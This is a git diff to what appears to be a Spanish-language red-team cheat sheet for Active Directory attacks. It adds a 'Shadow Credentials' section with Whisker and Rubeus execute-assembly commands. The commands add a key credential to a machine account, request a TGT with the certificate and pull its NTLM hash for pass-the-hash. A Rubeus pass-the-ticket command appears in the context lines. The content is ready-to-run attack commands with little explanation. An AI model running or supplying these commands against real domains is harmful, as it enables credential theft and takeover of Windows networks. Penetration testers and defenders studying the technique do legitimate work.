@@ -398,3 +398,11 @@ PTT
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dominio /username:usuario_impersonado /password:FakePass /ticket:
 ```
 ## Shadow Credentials
+Coger el certificado
+```
+execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe add /target:equipo$ /domain:dominio
+```
+Coger el hash NTLM y hacer PTH
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dc-2$ /certificate:certificado /password:"Vt1E6BzV8qehrqkn" /domain:dominio /dc:equipo.dominio /getcredentials /show
+```
